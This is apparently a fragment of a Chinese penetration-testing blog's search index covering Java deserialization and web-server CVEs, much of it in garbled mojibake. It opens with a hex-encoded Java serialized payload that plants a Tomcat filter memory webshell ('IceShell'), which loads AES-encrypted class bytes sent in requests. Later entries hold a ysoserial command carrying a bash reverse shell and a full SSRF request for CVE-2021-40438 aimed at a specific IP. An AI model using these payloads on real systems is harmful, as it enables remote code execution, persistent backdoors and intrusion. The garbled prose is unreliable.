4f7745414157494241414a6251674541436c4e7664584a6a5a555a706247554241415a564c6d7068646d454d41415541426777414741415a415141425651454146577068646d4576624746755a7939446247467a633078765957526c636745414332526c5a6d6c755a554e7359584e7a415141584b46744353556b7054477068646d4576624746755a7939446247467a637a734149514144414151414141414141414941414141464141594141514148414141414f67414341414941414141474b6975334141477841414141416741494141414142674142414141414167414a4141414146674143414141414267414b4141734141414141414159414441414e414145414151414f41413841415141484141414150514145414149414141414a4b6973444b37363341414b7741414141416741494141414142674142414141414177414a4141414146674143414141414351414b414173414141414141416b4145414152414145414151415341414141416741540a00b000b10700b20c00b300b40100186a6176612f7574696c2f426173653634244465636f6465720100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b420800b601000b646566696e65436c6173730700b80100025b420900ba00bb0700bc0c00bd00be0100116a6176612f6c616e672f496e7465676572010004545950450100114c6a6176612f6c616e672f436c6173733b0a009000c00c00c100c20100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0a00c400c50700c60c00c700c80100186a6176612f6c616e672f7265666c6563742f4d6574686f6401000d73657441636365737369626c65010004285a29560800ca010001550a00cc00cd0700ce0c00cf00d00100156a6176612f6c616e672f436c6173734c6f616465720100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0700d20100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0a00ba00d40c00d500d601000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b0a00c400d80c00d900da010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0a009000dc0c00dd00de0100166765744465636c61726564436f6e7374727563746f72010033285b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b0a00e000c50700e101001d6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f720a009000e30c00e4002f01000e676574436c6173734c6f616465720a00e000e60c00e700e801000b6e6577496e7374616e6365010027285b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0800ea010001670800ec010001750b00ee00ef0700f00c00f100f201001e6a617661782f736572766c65742f687474702f4874747053657373696f6e01000c736574417474726962757465010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b29560800f40100034145530a00f600f70700f80c00f900fa0100136a617661782f63727970746f2f43697068657201000b676574496e7374616e6365010029284c6a6176612f6c616e672f537472696e673b294c6a617661782f63727970746f2f4369706865723b0700fc01001f6a617661782f63727970746f2f737065632f5365637265744b6579537065630a003d00fe0c00ff0100010008676574427974657301000428295b420a00fb01020c00050103010017285b424c6a6176612f6c616e672f537472696e673b29560a00f601050c01060107010004696e697401001728494c6a6176612f73656375726974792f4b65793b29560b000f01090c010a010b01000967657452656164657201001a28294c6a6176612f696f2f42756666657265645265616465723b0a010d010e07010f0c0110003b0100166a6176612f696f2f4275666665726564526561646572010008726561644c696e650a00f601120c01130114010007646f46696e616c010006285b42295b420a009001160c00e7011701001428294c6a6176612f6c616e672f4f626a6563743b08009b08011a01000c4175746f6d6e65477265657407011c0100306f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173650a011b011e0c011f012001000c6765745265736f757263657301002728294c6f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f743b0b012201230701240c012501260100236f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f7401000a676574436f6e7465787401001f28294c6f72672f6170616368652f636174616c696e612f436f6e746578743b0701280100286f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e7465787408012a0100286f72672e6170616368652e636174616c696e612e636f72652e5374616e64617264436f6e746578740a0090012c0c012d00d0010007666f724e616d6508012f01000d66696c746572436f6e666967730a009001310c013201330100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0a013500c50701360100176a6176612f6c616e672f7265666c6563742f4669656c640a013501380c0139013a010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0b001d01380a000a000307013e01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465660a013d00030a013d01410c0142014301000973657446696c746572010019284c6a617661782f736572766c65742f46696c7465723b29560a013d01450c0146008601000d73657446696c7465724e616d650a013d01480c0149008601000e73657446696c746572436c6173730a0127014b0c014c014d01000c61646446696c746572446566010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b295607014f01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61700a014e00030801520100022f2a0a014e01540c0155008601000d61646455524c5061747465726e0a014e0145090158015907015a0c015b015c01001c6a617661782f736572766c65742f44697370617463686572547970650100075245515545535401001e4c6a617661782f736572766c65742f44697370617463686572547970653b0a0158015e0c015f003b0100046e616d650a014e01610c0162008601000d736574446973706174636865720a012701640c0165016601001261646446696c7465724d61704265666f7265010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b29560701680100306f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e66696707016a01001b6f72672f6170616368652f636174616c696e612f436f6e7465787407016c0100146a617661782f736572766c65742f46696c74657201000d436f6e7374616e7456616c7565010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000a4c4963655368656c6c3b01001f284c6a617661782f736572766c65742f46696c746572436f6e6669673b295601000c66696c746572436f6e66696701001c4c6a617661782f736572766c65742f46696c746572436f6e6669673b01000a457863657074696f6e7307017801001e6a617661782f736572766c65742f536572766c6574457863657074696f6e01005b284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b4c6a617661782f736572766c65742f46696c746572436861696e3b295601000770726f636573730100134c6a6176612f6c616e672f50726f636573733b0100066275666665720100036c656e01000149010002696e0100154c6a6176612f696f2f496e70757453747265616d3b010001650100154c6a6176612f6c616e672f457863657074696f6e3b0100064c636c61737301000e736572766c65745265717565737401001e4c6a617661782f736572766c65742f536572766c6574526571756573743b01000f736572766c6574526573706f6e736501001f4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b01000b66696c746572436861696e01001b4c6a617661782f736572766c65742f46696c746572436861696e3b0100274c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b0100284c6a617661782f736572766c65742f687474702f48747470536572766c6574526573706f6e73653b0100204c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b01000b70616765436f6e7465787401000f4c6a6176612f7574696c2f4d61703b010002636c0100174c6a6176612f6c616e672f436c6173734c6f616465723b010003636d640100164c6f63616c5661726961626c65547970655461626c650100354c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b01000d537461636b4d61705461626c6507019601001c6a617661782f736572766c65742f536572766c65745265717565737407019801001d6a617661782f736572766c65742f536572766c6574526573706f6e736507019a0100136a6176612f696f2f494f457863657074696f6e01000764657374726f7901000576617231380100224c6a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e3b010006646566696e6501001a4c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000675636c61737301000b636f6e7374727563746f7201001f4c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b0100124c6a6176612f6c616e672f4f626a6563743b010002556d0100016b010001630100154c6a617661782f63727970746f2f4369706865723b01000b65436c617373427974657301000665636c617373010001610100016201000862797465636f64650100095369676e61747572650100a7284c6a6176612f6c616e672f436c6173733b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b4c6a617661782f736572766c65742f687474702f48747470536572766c6574526571756573743b4c6a6176612f7574696c2f4d61703c4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b3e3b29560100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b2956010008646f63756d656e7401002d4c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b01000868616e646c6572730100425b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0701b6010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e0100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560100086974657261746f720100354c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b01000768616e646c65720100414c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b0100083c636c696e69743e01000666696c7465720100164c6a617661782f736572766c65742f46696c7465723b01000966696c7465724465660100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b01000966696c7465724d61700100314c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b0100324c6f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e6669673b010015776562617070436c6173734c6f61646572426173650100324c6f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173653b01000f7374616e64617264436f6e7465787401002a4c6f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578743b010007436f6e666967730100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000a536f7572636546696c6501000d4963655368656c6c2e6a61766101000c496e6e6572436c61737365730100074465636f6465720021000a00020001016b00010012000d000e0001016d00000002000700080001000500060001016e0000003d000200010000000b2ab700012a1207b50009b100000002016f0000000e00030000002400040022000a002501700000000c00010000000b0171017200000001010601730002016e000000350000000200000001b100000002016f000000060001000000280170000000160002000000010171017200000000000101740175000101760000000400010177000100a501790002016e0000046e0006000e000002012bc0000f3a042cc000113a051904b9001301003a06bb001759b700193a071907121a1906b9001c030057190712221904b9001c030057190712241905b9001c030057b80026b6002c3a0819041230b9003202003a0912361904b900380100b6003c9900751909c600701909b60042b600459a0065b800491909b6004f3a0a110400bc083a0b190ab600533a0d190d190bb6005959360c029f00151905b9005f0100190b03150cb60063a7ffe3190db60069b13a0a1905b9006e0100bb007259b700741275b60077190ab6007bb60077b6007eb60081b112871904b900380100b6003c9901161908b60089b6008fb600941297b600999900101908b60089b6008f3a0aa700d81908b60089b6008fb6008fb600941297b600999900131908b60089b6008fb6008f3a0aa700b21908b60089b6008fb6008fb6008fb600941297b600999900161908b60089b6008fb6008fb6008f3a0aa700861908b60089b6008fb6008fb6008fb6008fb600941297b600999900191908b60089b6008fb6008fb6008fb6008f3a0aa700541908b60089b6008fb6008fb6008fb6008fb6008fb600941297b6009999001c1908b60089b6008fb6008fb6008fb6008fb6008f3a0aa7001c1908b60089b6008fb6008fb6008fb6008fb6008fb6008f3a0a2a190a1908190619041907b6009da700053a0b2d2b2cb900a10300a7000b2d2b2cb900a10300b10002007400b100b2006c00e501e801eb006c0004016f0000009a00260000002b0006002c000c002d0015002e001e002f002a00300036003100420032004a00350055003600740038007e00390085003b008c003c009a003d00ac003f00b1004000b2004100b4004200d5004300d6004800e5004b00f8004c0105004d011b004e012b004f0144005001570051017300520189005301a8005401c1005601da005801e8005b01eb005901ed005d01f8005f020000610170000000d40015007e0034017a017b000a0085002d017c00b8000b0096001c017d017e000c008c0026017f0180000d00b4002201810182000a01020003018300be000a01280003018300be000a01540003018300be000a01860003018300be000a01be0003018300be000a01da0011018300be000a00000201017101720000000002010184018500010000020101860187000200000201018801890003000601fb0023018a0004000c01f50025018b0005001501ec001b018c0006001e01e3018d018e0007004a01b7018f01900008005501ac0191000e000901920000000c0001001e01e3018d019300070194000000bf000eff008c000e07000a0701950701970700a207000f0700110700ee07001d0700cc07003d0700540700b70007005a0000ff001f000e07000a0701950701970700a207000f0700110700ee07001d0700cc07003d0700540700b70107005a0000ff0005000a07000a0701950701970700a207000f0700110700ee07001d0700cc07003d000107006c232e252b3137fc0018070090ff0010000a07000a0701950701970700a207000f0700110700ee07001d0700cc07003d000107006c010a070176000000060002019901770001019b00060001016e0000002b0000000100000001b100000002016f0000000600010000006501700000000c0001000000010171017200000001009f00a00002016e000002e20006001200000130b800a712adb600af3a062b12b506bd0090590312b7535904b200b9535905b200b953b600bf3a07190704b600c3013a082c12c9b600cb3a08a700293a0919072c06bd008a5903190653590403b800d35359051906beb800d353b600d7c000903a08190804bd0090590312cc53b600db3a09190904b600df190904bd008a59032ab60089b600e253b600e53a0a190812e904bd0090590312b753b600bf3a0b190b04b600c312073a0c2d12eb190cb900ed030012f3b800f53a0d190d05bb00fb59190cb600fd12f3b70101b60104190db800a71904b901080100b6010cb600afb601113a0e190b190a04bd008a5903190e53b600d7c000903a0f190fb601153a10190f13011804bd00905903128a53b600bf3a11191104b600c31911191004bd008a5903190553b600d757a700053a07b1000200300038003b00d1000a012a012d006c0004016f0000006a001a00000068000a006b0027006c002d006d0030007000380073003b0071003d0072006100750071007600770077008c0078009e007900a4007a00a8007b00b2007c00b9007d00cd007e00e4007f00f90080010000810113008201190083012a0085012d0084012f00870170000000c00013003d0024019c019d000900270103019e019f0007003000fa01a000be0008007100b901a101a20009008c009e00ec01a3000a009e008c01a4019f000b00a8008201a5000e000c00b9007101a601a7000d00e4004601a800b8000e00f9003101a900be000f0100002a01aa01a300100113001701ab019f00110000013001710172000000000130018300be000100000130018f0190000200000130001b018c0003000001300023018a000400000130018d018e0005000a012601ac00b8000601920000000c000100000130018d019300050194000000480004ff003b000907000a0700900700cc0700ee07000f07001d0700b70700c407009000010700d125ff00cb000707000a0700900700cc0700ee07000f07001d0700b7000107006c0101ad0000000201ae000101af01b00002016e0000003f0000000300000001b100000002016f0000000600010000008a0170000000200003000000010171017200000000000101b101b200010000000101b301b40002017600000004000101b5000101af01b70002016e000000490000000400000001b100000002016f0000000600010000008d01700000002a0004000000010171017200000000000101b101b200010000000101b801b900020000000101ba01bb0003017600000004000101b5000801bc00060001016e000001e50005000a000000e91301194bb80026b6002cc0011b4c2bb6011db901210100c001274d130129b8012b13012eb601304e2d04b601342d2cb60137c0001d3a041904130119b9013b0200c700a3bb000a59b7013c3a05bb013d59b7013f3a0619061905b601401906130119b6014419061905b60089b60094b601472c1906b6014abb014e59b701503a071907130151b601531907130119b601561907b20157b6015db601602c1907b6016313016705bd0090590313016953590413013d53b600db3a08190804b600df190805bd008a59032c535904190653b600e5c001673a0919041301191909b9001c030057a700044bb10001000000e400e7006c0003016f0000006600190000009100040092000e0093001b009400280095002d00960037009700440098004d00990056009a005d009b0065009c0072009d0078009e0081009f008900a0009100a1009c00a200a200a300ba00a400c000a500d700a600e400a900e700a800e800ab017000000066000a004d009701bd01be00050056008e01bf01c000060081006301c101c2000700ba002a01a101a2000800d7000d017401c30009000400e0015f000e0000000e00d601c401c50001001b00c901c601c70002002800bc01c801c90003003700ad012f018e000401940000000a0003fb00e44207006c00000201ca0000000201cb01cc0000000a000100b000a801cd0009707400013170770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0014707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000002774000f47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a61766174000367656e7371007e00170000000f71007e001971007e001a7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00137872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0023787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e001378707371007e00220000000177040000000171007e00077878;,","tags":["fastjson"]},{"title":"CVE-java-jackson-xstream-fastjson","path":"/2025/07/14/posts/CVE-java-jackson-xstream-fastjson/","content":"CVE-java-jackson-xstream-fastjson jacksonjackson CVE-2020-8840JNDI CVE-2020-35728JNDI XstreamXstream å¼€æºJavaç±»åº“ï¼Œèƒ½å°†å¯¹è±¡åºåˆ—åŒ–æˆXMLæˆ–XMLååºåˆ—åŒ–ä¸ºå¯¹è±¡ ä»£ç æ‰§è¡Œ (CVE-2021-21351ï¼‰Xstream1.4.15 vulhubxstreamCVE-2021-21351README.zh-cn.md at master Â· vulhubvulhub Â· GitHub ç›´æ¥æ”¹å˜ç±»å‹ä¸ºxml æ”¾å…¥JNDIæ³¨å…¥ä»£ç  åå¼¹æˆåŠŸ CVE-2021-29505vulhubxstreamCVE-2021-29505README.zh-cn.md at master Â· vulhubvulhub Â· GitHub XStream 1.4.16 ä½ å¯ä»¥å…ˆæµ‹è¯•ä¸‹è§£æXMLä¸ è¦çœ‹å¯¹æ–¹çš„ä»£ç é€»è¾‘ æ˜¯çœ‹å…·ä½“æ ‡ç­¾å¯¹ä¸å¯¹è¿˜æ˜¯æ ¼å¼å¯¹å°±è¡Œ ?xml version=1.0 encoding=UTF-8? user nameBob/name age22/age /useruseræ˜¯æ ‡ç­¾ é‡Œé¢æ˜¯ä»–çš„å­æ ‡ç­¾ java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1089 CommonsCollections6 â€œbash -c {echo,base64æ•°æ®åå¼¹å‘½ä»¤}|{base64,-d}|{bash,-i}â€ bash -i devtcpxxxx 01 æµ‹è¯•æœ‰xmlæ•°æ®å‘é€ æœ¬åœ°ç›‘å¬ä¸€ä¸ª1089ç«¯å£ é‡Œé¢æ˜¯CCé“¾æ¡çš„åå¼¹SHELLå‘½ä»¤ æ”¾å…¥POC åå¼¹æˆåŠŸ è¿™é‡Œå·¥å…·ä½¿ç”¨ysoserial-all.jar å’Œ ysoserial-0.0.8-SNAPSHOT-all.jaréƒ½å¯ä»¥ FASTJSONfastjsonåˆ°1.2.80 å·²ç»åŸºæœ¬æŠŠæœ¬åœ°é“¾æ¡å°å®Œäº† åªèƒ½é€šè¿‡å¤–éƒ¨é“¾æ¥ æ‰§è¡Œ vulhubfastjson1.2.24-rceREADME.zh-cn.md at master Â· vulhubvulhub Â· GitHub 1.2.40 è¿™é‡Œæ˜¯è®¿é—®ä¼šè¿”å›JSONæ•°æ®æˆ‘ä»¬è¾“å…¥é”™è¯¯å¯ä»¥ åˆ›å»ºæˆåŠŸ ä»‹ç»ä¸¤ä¸ªæ¨èæ’ä»¶ å³é”®å‘é€ ç›´æ¥çˆ†å‡ºåˆ©ç”¨ä»£ç  FastjsonScan çˆ†å‡ºç‰ˆæœ¬FastjsonScan4Burp","tags":["jackson","xstream","fastjson"]},{"title":"CVE-vulfocus-apache-tomcat-jetty-weblogic","path":"/2025/07/13/posts/CVE-apache-jetty-tomcat/","content":"CVE-vulfocus-apache-tomcat-jetty-weblogic ApacheSSRF-CVE-2021-40438ç‰ˆæœ¬åœ¨å…¶2.4.48åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­ Apache HTTP Serveræ˜¯ApacheåŸºé‡‘ä¼šå¼€æºçš„ä¸€æ¬¾æµè¡Œçš„HTTPæœåŠ¡å™¨ã€‚åœ¨å…¶2.4.48åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œmod_proxyæ¨¡å—å­˜åœ¨ä¸€å¤„é€»è¾‘é”™è¯¯å¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶åå‘ä»£ç†æœåŠ¡å™¨çš„åœ°å€ï¼Œè¿›è€Œå¯¼è‡´SSRFæ¼æ´ è®¿é—®è¾“å…¥POC GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/ HTTP/1.1Host: 123.58.224.8:31947Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: close 